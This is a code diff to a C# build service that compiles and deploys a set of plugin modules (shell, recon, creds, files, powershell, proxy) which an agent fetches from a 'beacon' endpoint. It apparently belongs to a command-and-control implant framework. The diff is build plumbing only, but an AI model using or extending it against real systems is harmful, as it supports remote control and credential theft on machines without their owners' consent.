@@ -89,39 +89,66 @@ public partial class BuilderBuildService
     }
 
     // ══════════════════════════════════════════════════════════════════
-    // Stage 1.6: Build cloud modules (shell) for this platform
+    // Stage 1.6: Build cloud modules for this platform
     // ══════════════════════════════════════════════════════════════════
+
+    // Module name -> cdylib lib target name (as produced by cargo).
+    // The deployed file is named {moduleName}.{ext} and is fetched by the
+    // agent via /api/beacon/module/{moduleName}.
+    private static readonly (string Module, string Lib)[] CloudModules =
+    [
+        ("shell", "shell_module"),
+        ("recon", "recon_module"),
+        ("creds", "creds_module"),
+        ("files", "files_module"),
+        ("powershell", "powershell_module"),
+        ("proxy", "proxy_module"),
+    ];
 
     private static async Task Stage1_6_BuildModuleAsync(BuildContext ctx, string targetArg, BuildJob job)
     {
-        job.Log($"=== Stage 1.6: Building shell module ({ctx.TargetTriple}) ===");
-        var moduleBuildArgs = $"build --release {targetArg} -p shell-module --target-dir \"{ctx.TargetDir}\"";
+        job.Log($"=== Stage 1.6: Building cloud modules ({ctx.TargetTriple}) ===");
+
+        var packages = string.Join(" ", CloudModules
+            .Select(m => m.Lib.StartsWith("shell_") ? "-p shell-module" : $"-p {m.Module}-module")
+            .Distinct());
+
+        var moduleBuildArgs = $"build --release {targetArg} {packages} --target-dir \"{ctx.TargetDir}\"";
         var moduleBuildResult = await RunProcessAsync("cargo", moduleBuildArgs, job, RustAgentDir, ctx.EnvVars);
-        if (moduleBuildResult.ExitCode == 0)
+        if (moduleBuildResult.ExitCode != 0)
         {
-            var moduleDllName = ctx.IsWindows ? "shell_module.dll" : ctx.IsMacos ? "libshell_module.dylib" : "libshell_module.so";
-            var modulePath = Path.Combine(ctx.ReleaseDir, moduleDllName);
+            job.Log("[WARN] cloud module build failed — cloud modules unavailable");
+            return;
+        }
+
+        Directory.CreateDirectory(ModulesDir);
+        var deployed = 0;
+        foreach (var (moduleName, libName) in CloudModules)
+        {
+            var artifact = ctx.IsWindows
+                ? $"{libName}.dll"
+                : ctx.IsMacos
+                    ? $"lib{libName}.dylib"
+                    : $"lib{libName}.so";
+            var modulePath = Path.Combine(ctx.ReleaseDir, artifact);
             if (!System.IO.File.Exists(modulePath))
             {
-                var found = Directory.GetFiles(ctx.ReleaseDir, "*shell*")
+                var found = Directory.GetFiles(ctx.ReleaseDir, $"*{libName}*")
                     .FirstOrDefault(f => f.EndsWith(".dll") || f.EndsWith(".so") || f.EndsWith(".dylib"));
                 if (found != null) modulePath = found;
             }
             if (System.IO.File.Exists(modulePath))
             {
-                Directory.CreateDirectory(ModulesDir);
-                System.IO.File.Copy(modulePath, Path.Combine(ModulesDir, $"shell.{ctx.ModuleExt}"), true);
-                job.Log($"Shell module deployed to build-output/modules/shell.{ctx.ModuleExt}");
+                System.IO.File.Copy(modulePath, Path.Combine(ModulesDir, $"{moduleName}.{ctx.ModuleExt}"), true);
+                job.Log($"Deployed {moduleName}.{ctx.ModuleExt}");
+                deployed++;
             }
             else
             {
-                job.Log("[WARN] shell module binary not found after build");
+                job.Log($"[WARN] {moduleName} module binary not found after build");
             }
         }
-        else
-        {
-            job.Log($"[WARN] shell module build failed (exit {moduleBuildResult.ExitCode}) — cloud shell unavailable");
-        }
+        job.Log($"Cloud modules deployed: {deployed}/{CloudModules.Length} -> build-output/modules/");
     }
 
     // ══════════════════════════════════════════════════════════════════
